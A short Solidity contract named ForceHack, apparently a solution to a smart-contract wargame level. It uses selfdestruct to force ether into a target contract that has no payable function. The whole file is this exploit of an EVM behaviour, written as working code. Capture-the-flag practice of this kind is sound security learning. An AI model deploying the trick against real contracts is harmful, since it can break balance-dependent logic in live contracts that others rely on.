// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {
    constructor() {}

    function send(address payable _force) public payable {
        selfdestruct(_force);
    }
}
